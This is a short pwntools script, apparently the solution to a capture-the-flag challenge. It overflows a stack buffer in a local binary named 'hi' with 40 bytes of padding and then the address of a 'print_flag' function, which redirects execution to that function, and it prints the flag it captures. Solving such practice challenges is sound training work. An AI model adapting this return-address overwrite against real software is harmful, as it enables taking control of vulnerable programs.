from pwn import *

context.binary = "./hi"

p = process()
p.sendline(b"A" * 32 + b"a" * 8 + p64(context.binary.functions["print_flag"].address))
log.success(p.recvline_regex(rb".*{.*}.*").decode("ascii"))
